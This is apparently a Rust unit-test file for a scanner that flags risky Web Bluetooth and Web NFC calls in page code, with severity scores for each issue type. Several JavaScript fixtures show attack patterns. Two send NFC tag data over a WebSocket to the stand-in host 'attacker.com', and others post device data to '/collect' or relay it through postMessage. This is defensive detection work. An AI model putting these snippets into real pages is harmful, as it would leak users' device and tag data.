use crate::wireless_api_audit::*;

#[test]
fn empty_body_no_issues() {
    let issues = analyze_wireless_api("");
    assert!(issues.is_empty());
}

#[test]
fn no_wireless_api_no_issues() {
    let body = "<html><body>Hello</body></html>";
    let issues = analyze_wireless_api(body);
    assert!(issues.is_empty());
}

#[test]
fn detects_web_bluetooth_access() {
    let body = "navigator.bluetooth.requestDevice({filters: []})";
    let issues = analyze_wireless_api(body);
    assert!(issues.contains(&WirelessApiIssue::WebBluetoothAccess));
}

#[test]
fn detects_bluetooth_device_scan() {
    let body = "navigator.bluetooth.requestDevice({acceptAllDevices: true})";
    let issues = analyze_wireless_api(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothDeviceScan));
}

#[test]
fn detects_optional_services_scan() {
    let body = r#"navigator.bluetooth.requestDevice({optionalServices: ['battery_service']})"#;
    let issues = analyze_wireless_api(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothDeviceScan));
}

#[test]
fn detects_gatt_connection() {
    let body = "device.gatt.connect().then(server => server.getPrimaryService('heart_rate'))";
    let issues = analyze_wireless_api(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothGattConnection));
}

#[test]
fn detects_gatt_via_get_primary_service() {
    let body = "navigator.bluetooth.requestDevice({}); server.getPrimaryService('battery')";
    let issues = analyze_wireless_api(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothGattConnection));
}

#[test]
fn detects_web_nfc_access() {
    let body = "const reader = new NDEFReader();";
    let issues = analyze_wireless_api(body);
    assert!(issues.contains(&WirelessApiIssue::WebNfcAccess));
}

#[test]
fn detects_nfc_write_operation() {
    let body = "const writer = new NDEFWriter();";
    let issues = analyze_wireless_api(body);
    assert!(issues.contains(&WirelessApiIssue::NfcWriteOperation));
}

#[test]
fn detects_wireless_data_exfiltration() {
    let body = r#"
        navigator.bluetooth.requestDevice({}).then(device => {
            fetch('/collect', {method:'POST', body: JSON.stringify(device)});
        });
    "#;
    let issues = analyze_wireless_api(body);
    assert!(issues.contains(&WirelessApiIssue::WirelessDataExfiltration));
}

#[test]
fn severity_exfiltration_highest() {
    assert_eq!(
        wireless_api_severity(&WirelessApiIssue::WirelessDataExfiltration),
        8.0
    );
}

#[test]
fn severity_bluetooth_access_lowest() {
    assert_eq!(
        wireless_api_severity(&WirelessApiIssue::WebBluetoothAccess),
        6.0
    );
}

#[test]
fn to_operations_creates_entries() {
    let issues = vec![
        WirelessApiIssue::WebBluetoothAccess,
        WirelessApiIssue::WebNfcAccess,
    ];
    let mut seq = 0;
    let ops = wireless_api_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn display_variants() {
    assert_eq!(
        WirelessApiIssue::WebBluetoothAccess.to_string(),
        "web_bluetooth_access"
    );
    assert_eq!(
        WirelessApiIssue::BluetoothGattConnection.to_string(),
        "bluetooth_gatt_connection"
    );
    assert_eq!(WirelessApiIssue::WebNfcAccess.to_string(), "web_nfc_access");
    assert_eq!(
        WirelessApiIssue::NfcWriteOperation.to_string(),
        "nfc_write_operation"
    );
}

#[test]
fn security_empty_body_no_issues() {
    let issues = analyze_wireless_security("");
    assert!(issues.is_empty());
}

#[test]
fn security_no_wireless_api_no_issues() {
    let body = "<html><body>Hello World</body></html>";
    let issues = analyze_wireless_security(body);
    assert!(issues.is_empty());
}

#[test]
fn detects_bluetooth_characteristic_read() {
    let body = r#"
        navigator.bluetooth.requestDevice({}).then(device => {
            device.gatt.connect().then(server => {
                return server.getPrimaryService('heart_rate');
            }).then(service => {
                return service.getCharacteristic('heart_rate_measurement');
            }).then(characteristic => {
                return characteristic.readValue();
            });
        });
    "#;
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothCharacteristicRead));
}

#[test]
fn detects_bluetooth_characteristic_read_via_get_characteristic() {
    let body = "navigator.bluetooth.requestDevice({}); service.getCharacteristic('battery_level');";
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothCharacteristicRead));
}

#[test]
fn detects_bluetooth_characteristic_read_via_start_notifications() {
    let body = "navigator.bluetooth.requestDevice({}); characteristic.startNotifications();";
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothCharacteristicRead));
}

#[test]
fn detects_bluetooth_characteristic_write() {
    let body = r#"
        navigator.bluetooth.requestDevice({}).then(device => {
            characteristic.writeValue(new Uint8Array([0x01]));
        });
    "#;
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothCharacteristicWrite));
}

#[test]
fn detects_bluetooth_characteristic_write_with_response() {
    let body =
        "navigator.bluetooth.requestDevice({}); characteristic.writeValueWithResponse(data);";
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothCharacteristicWrite));
}

#[test]
fn detects_bluetooth_characteristic_write_without_response() {
    let body =
        "navigator.bluetooth.requestDevice({}); characteristic.writeValueWithoutResponse(data);";
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothCharacteristicWrite));
}

#[test]
fn detects_bluetooth_without_permission() {
    let body = "navigator.bluetooth.requestDevice({filters: [{services: ['heart_rate']}]});";
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothWithoutPermission));
}

#[test]
fn no_bluetooth_without_permission_when_permissions_present() {
    let body = r#"
        navigator.permissions.query({name: 'bluetooth'}).then(result => {
            if (result.state === 'granted') {
                navigator.bluetooth.requestDevice({});
            }
        });
    "#;
    let issues = analyze_wireless_security(body);
    assert!(!issues.contains(&WirelessApiIssue::BluetoothWithoutPermission));
}

#[test]
fn no_bluetooth_without_permission_when_request_permission_present() {
    let body = "requestPermission(); navigator.bluetooth.requestDevice({});";
    let issues = analyze_wireless_security(body);
    assert!(!issues.contains(&WirelessApiIssue::BluetoothWithoutPermission));
}

#[test]
fn detects_nfc_relay_attack_via_post_message() {
    let body = r#"
        const reader = new NDEFReader();
        reader.scan().then(() => {
            reader.onreading = event => {
                window.parent.postMessage(event.message, '*');
            };
        });
    "#;
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::NfcRelayAttack));
}

#[test]
fn detects_nfc_relay_attack_via_websocket() {
    let body = r#"
        const reader = new NDEFReader();
        const ws = new WebSocket('wss://attacker.com');
        reader.onreading = event => {
            ws.send(JSON.stringify(event.message));
        };
    "#;
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::NfcRelayAttack));
}

#[test]
fn detects_nfc_relay_attack_via_fetch() {
    let body = r#"
        const reader = new NDEFReader();
        reader.onreading = event => {
            fetch('/relay', {method: 'POST', body: JSON.stringify(event)});
        };
    "#;
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::NfcRelayAttack));
}

#[test]
fn detects_bluetooth_in_worker() {
    let body = r#"
        navigator.bluetooth.requestDevice({});
        const worker = new Worker('bluetooth-worker.js');
        worker.postMessage({type: 'scan'});
    "#;
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothInWorker));
}

#[test]
fn detects_bluetooth_in_shared_worker() {
    let body = "navigator.bluetooth.requestDevice({}); const sw = new SharedWorker('shared.js');";
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothInWorker));
}

#[test]
fn detects_wireless_fingerprinting_via_fingerprint() {
    let body = "navigator.bluetooth.requestDevice({}); const fp = device.fingerprint;";
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::WirelessFingerprinting));
}

#[test]
fn detects_wireless_fingerprinting_via_hash() {
    let body = "navigator.bluetooth.requestDevice({}); const hash = sha256(device.id);";
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::WirelessFingerprinting));
}

#[test]
fn detects_wireless_fingerprinting_via_identifier() {
    let body = "navigator.bluetooth.requestDevice({}); const id = device.identifier;";
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::WirelessFingerprinting));
}

#[test]
fn detects_wireless_fingerprinting_via_device_id() {
    let body = "navigator.bluetooth.requestDevice({}); console.log(device.deviceId);";
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::WirelessFingerprinting));
}

#[test]
fn detects_bluetooth_cross_origin_via_post_message() {
    let body = r#"
        navigator.bluetooth.requestDevice({}).then(device => {
            window.parent.postMessage({device: device.id}, '*');
        });
    "#;
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothCrossOrigin));
}

#[test]
fn detects_bluetooth_cross_origin_via_cross_origin_keyword() {
    let body = "navigator.bluetooth.requestDevice({}); // cross-origin communication";
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothCrossOrigin));
}

#[test]
fn detects_bluetooth_cross_origin_via_iframe() {
    let body =
        "navigator.bluetooth.requestDevice({}); const frame = document.createElement('iframe');";
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothCrossOrigin));
}

#[test]
fn detects_nfc_data_injection_via_write() {
    let body = r#"
        const writer = new NDEFWriter();
        const ndef = {records: [{data: maliciousPayload}]};
        writer.write(ndef);
    "#;
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::NfcDataInjection));
}

#[test]
fn detects_nfc_data_injection_via_push() {
    let body = "const ndef = new NDEFReader(); message.records.push({data: payload});";
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::NfcDataInjection));
}

#[test]
fn detects_nfc_data_injection_via_make_record() {
    let body = "const ndef = new NDEFReader(); const record = makeRecord({data: userInput});";
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::NfcDataInjection));
}

#[test]
fn detects_bluetooth_persistent_connection_via_keep_alive() {
    let body = r#"
        navigator.bluetooth.requestDevice({}).then(device => {
            device.gatt.connect({keepAlive: true});
        });
    "#;
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothPersistentConnection));
}

#[test]
fn detects_bluetooth_persistent_connection_via_set_interval() {
    let body = r#"
        navigator.bluetooth.requestDevice({});
        setInterval(() => device.gatt.connect(), 5000);
    "#;
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothPersistentConnection));
}

#[test]
fn detects_bluetooth_persistent_connection_via_reconnect() {
    let body =
        "navigator.bluetooth.requestDevice({}); device.addEventListener('disconnect', reconnect);";
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothPersistentConnection));
}

#[test]
fn detects_wireless_timing_attack_via_performance_now() {
    let body = r#"
        navigator.bluetooth.requestDevice({}).then(device => {
            const start = performance.now();
            device.gatt.connect();
            const elapsed = performance.now() - start;
        });
    "#;
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::WirelessTimingAttack));
}

#[test]
fn detects_wireless_timing_attack_via_date_now() {
    let body = "navigator.bluetooth.requestDevice({}); const timestamp = Date.now();";
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::WirelessTimingAttack));
}

#[test]
fn detects_wireless_timing_attack_via_performance_mark() {
    let body = "navigator.bluetooth.requestDevice({}); performance.mark('bluetooth-start');";
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::WirelessTimingAttack));
}

#[test]
fn security_to_operations_creates_entries() {
    let issues = vec![
        WirelessApiIssue::BluetoothCharacteristicRead,
        WirelessApiIssue::NfcRelayAttack,
    ];
    let mut seq = 0;
    let ops = wireless_security_to_operations(&issues, &mut seq);
    assert_eq!(ops.len(), 2);
    assert_eq!(seq, 2);
}

#[test]
fn severity_nfc_relay_highest() {
    assert_eq!(
        wireless_api_severity(&WirelessApiIssue::NfcRelayAttack),
        9.0
    );
}

#[test]
fn severity_nfc_data_injection() {
    assert_eq!(
        wireless_api_severity(&WirelessApiIssue::NfcDataInjection),
        8.5
    );
}

#[test]
fn severity_bluetooth_characteristic_write() {
    assert_eq!(
        wireless_api_severity(&WirelessApiIssue::BluetoothCharacteristicWrite),
        8.0
    );
}

#[test]
fn severity_bluetooth_cross_origin() {
    assert_eq!(
        wireless_api_severity(&WirelessApiIssue::BluetoothCrossOrigin),
        7.5
    );
}

#[test]
fn severity_wireless_fingerprinting() {
    assert_eq!(
        wireless_api_severity(&WirelessApiIssue::WirelessFingerprinting),
        7.0
    );
}

#[test]
fn severity_bluetooth_characteristic_read() {
    assert_eq!(
        wireless_api_severity(&WirelessApiIssue::BluetoothCharacteristicRead),
        6.5
    );
}

#[test]
fn severity_wireless_timing_attack() {
    assert_eq!(
        wireless_api_severity(&WirelessApiIssue::WirelessTimingAttack),
        6.5
    );
}

#[test]
fn severity_bluetooth_in_worker() {
    assert_eq!(
        wireless_api_severity(&WirelessApiIssue::BluetoothInWorker),
        6.0
    );
}

#[test]
fn severity_bluetooth_persistent_connection() {
    assert_eq!(
        wireless_api_severity(&WirelessApiIssue::BluetoothPersistentConnection),
        5.5
    );
}

#[test]
fn severity_bluetooth_without_permission_lowest() {
    assert_eq!(
        wireless_api_severity(&WirelessApiIssue::BluetoothWithoutPermission),
        5.0
    );
}

#[test]
fn display_new_variants() {
    assert_eq!(
        WirelessApiIssue::BluetoothCharacteristicRead.to_string(),
        "bluetooth_characteristic_read"
    );
    assert_eq!(
        WirelessApiIssue::BluetoothCharacteristicWrite.to_string(),
        "bluetooth_characteristic_write"
    );
    assert_eq!(
        WirelessApiIssue::BluetoothWithoutPermission.to_string(),
        "bluetooth_without_permission"
    );
    assert_eq!(
        WirelessApiIssue::NfcRelayAttack.to_string(),
        "nfc_relay_attack"
    );
    assert_eq!(
        WirelessApiIssue::BluetoothInWorker.to_string(),
        "bluetooth_in_worker"
    );
    assert_eq!(
        WirelessApiIssue::WirelessFingerprinting.to_string(),
        "wireless_fingerprinting"
    );
    assert_eq!(
        WirelessApiIssue::BluetoothCrossOrigin.to_string(),
        "bluetooth_cross_origin"
    );
    assert_eq!(
        WirelessApiIssue::NfcDataInjection.to_string(),
        "nfc_data_injection"
    );
    assert_eq!(
        WirelessApiIssue::BluetoothPersistentConnection.to_string(),
        "bluetooth_persistent_connection"
    );
    assert_eq!(
        WirelessApiIssue::WirelessTimingAttack.to_string(),
        "wireless_timing_attack"
    );
}

#[test]
fn analyze_wireless_security_detects_multiple_issues() {
    let body = r#"
        navigator.bluetooth.requestDevice({}).then(device => {
            const worker = new Worker('bt.js');
            const characteristic = service.getCharacteristic('data');
            characteristic.writeValue(malicious);
            characteristic.readValue().then(value => {
                window.parent.postMessage(value, '*');
            });
        });
    "#;
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::BluetoothCharacteristicRead));
    assert!(issues.contains(&WirelessApiIssue::BluetoothCharacteristicWrite));
    assert!(issues.contains(&WirelessApiIssue::BluetoothInWorker));
    assert!(issues.contains(&WirelessApiIssue::BluetoothCrossOrigin));
}

#[test]
fn nfc_security_detects_multiple_issues() {
    let body = r#"
        const reader = new NDEFReader();
        reader.onreading = event => {
            const ws = new WebSocket('wss://attacker.com');
            ws.send(JSON.stringify(event.message));
            event.message.records.push({data: injected});
        };
    "#;
    let issues = analyze_wireless_security(body);
    assert!(issues.contains(&WirelessApiIssue::NfcRelayAttack));
    assert!(issues.contains(&WirelessApiIssue::NfcDataInjection));
}
